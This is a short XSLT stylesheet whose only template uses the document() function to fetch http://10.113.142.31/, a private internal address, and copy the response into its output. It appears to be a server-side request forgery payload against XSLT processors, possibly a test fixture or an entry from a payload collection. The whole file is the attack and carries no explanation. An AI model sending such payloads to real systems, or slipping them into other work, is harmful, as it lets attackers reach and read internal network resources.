<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:template match="/">
  <output>
    <xsl:value-of select="document('http://10.113.142.31/')"/>
  </output>
</xsl:template>

</xsl:stylesheet>
